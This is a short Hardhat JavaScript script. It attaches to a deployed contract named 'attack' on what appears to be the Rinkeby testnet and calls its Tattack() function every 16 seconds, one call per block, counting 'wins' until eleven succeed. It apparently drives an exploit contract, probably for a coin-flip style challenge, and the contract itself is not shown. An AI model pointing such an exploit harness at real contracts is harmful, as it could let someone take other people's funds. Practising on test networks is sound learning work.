const hre = require("hardhat");
const { setIntervalAsync, clearIntervalAsync } = require('set-interval-async');
let count =0;
let nIntervId;
async function main(){
  const contractFactory=await hre.ethers.getContractFactory("attack");
  const contract = await contractFactory.attach("0x46adB7ae915B71205Ee53a6D5b2349654ff5e16A");
  console.log("Target contract address : " + contract.address);
  nIntervId =setIntervalAsync(start,16*1000,contract);
  //time to next block in rinkeby 15s i use 16 if something happening
}
async function start(contract){
  const resultat =await contract.Tattack();
  count ++;
  console.log("Wins : "+count);
  if(count>10){
    await clearIntervalAsync(nIntervId);
  }
}
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});